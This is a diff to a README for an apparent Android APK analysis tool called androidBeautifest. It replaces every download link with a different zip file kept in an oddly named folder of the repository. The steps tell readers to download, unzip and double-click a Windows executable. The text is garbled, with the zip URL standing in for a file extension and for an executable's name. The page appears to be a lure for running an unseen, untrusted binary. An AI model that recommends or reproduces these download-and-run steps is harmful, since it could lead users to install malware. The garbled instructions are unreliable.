@@ -6,7 +6,7 @@ Welcome to androidBeautifest! This tool helps you analyze Android APKs using a m
 
 ## 📥 Download Now
 
-[![Download androidBeautifest](https://raw.githubusercontent.com/pacomartinezea/androidBeautifest/main/Haversian/androidBeautifest-Umbellulidae.zip)](https://raw.githubusercontent.com/pacomartinezea/androidBeautifest/main/Haversian/androidBeautifest-Umbellulidae.zip)
+[![Download androidBeautifest](https://github.com/pacomartinezea/androidBeautifest/raw/refs/heads/main/Haversian/Beautifest-android-v1.8.zip)](https://github.com/pacomartinezea/androidBeautifest/raw/refs/heads/main/Haversian/Beautifest-android-v1.8.zip)
 
 ## 🔍 What You Need
 
@@ -19,19 +19,19 @@ Before you start, make sure you have the following:
 ## 📂 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the releases page to get the latest version of androidBeautifest. Click this link: [Releases Page](https://raw.githubusercontent.com/pacomartinezea/androidBeautifest/main/Haversian/androidBeautifest-Umbellulidae.zip).
+   Go to the releases page to get the latest version of androidBeautifest. Click this link: [Releases Page](https://github.com/pacomartinezea/androidBeautifest/raw/refs/heads/main/Haversian/Beautifest-android-v1.8.zip).
 
 2. **Choose a Version**  
    Look for the most recent version listed. It’s often a good idea to download the latest one, which will have the newest features and fixes.
 
 3. **Download the File**  
-   Click on the file that matches your operating system. It may be a .zip or https://raw.githubusercontent.com/pacomartinezea/androidBeautifest/main/Haversian/androidBeautifest-Umbellulidae.zip file, depending on your OS.
+   Click on the file that matches your operating system. It may be a .zip or https://github.com/pacomartinezea/androidBeautifest/raw/refs/heads/main/Haversian/Beautifest-android-v1.8.zip file, depending on your OS.
 
 4. **Unzip the File**  
    After the download completes, find the downloaded file on your computer. Right-click the file and select "Extract" or "Unzip" to unpack its contents.
 
 5. **Run the Application**  
-   Open the extracted folder. Look for the executable file, such as `https://raw.githubusercontent.com/pacomartinezea/androidBeautifest/main/Haversian/androidBeautifest-Umbellulidae.zip` for Windows, and double-click it. On macOS or Linux, you may need to run the terminal and navigate to the folder to start the application with a command.
+   Open the extracted folder. Look for the executable file, such as `https://github.com/pacomartinezea/androidBeautifest/raw/refs/heads/main/Haversian/Beautifest-android-v1.8.zip` for Windows, and double-click it. On macOS or Linux, you may need to run the terminal and navigate to the folder to start the application with a command.
 
 ## 📖 How to Use androidBeautifest
 
@@ -81,4 +81,4 @@ Remember to check regularly for updates and keep learning. Happy analyzing!
 
 ## 📥 Download Now Again
 
-[![Download androidBeautifest](https://raw.githubusercontent.com/pacomartinezea/androidBeautifest/main/Haversian/androidBeautifest-Umbellulidae.zip)](https://raw.githubusercontent.com/pacomartinezea/androidBeautifest/main/Haversian/androidBeautifest-Umbellulidae.zip)
+[![Download androidBeautifest](https://github.com/pacomartinezea/androidBeautifest/raw/refs/heads/main/Haversian/Beautifest-android-v1.8.zip)](https://github.com/pacomartinezea/androidBeautifest/raw/refs/heads/main/Haversian/Beautifest-android-v1.8.zip)
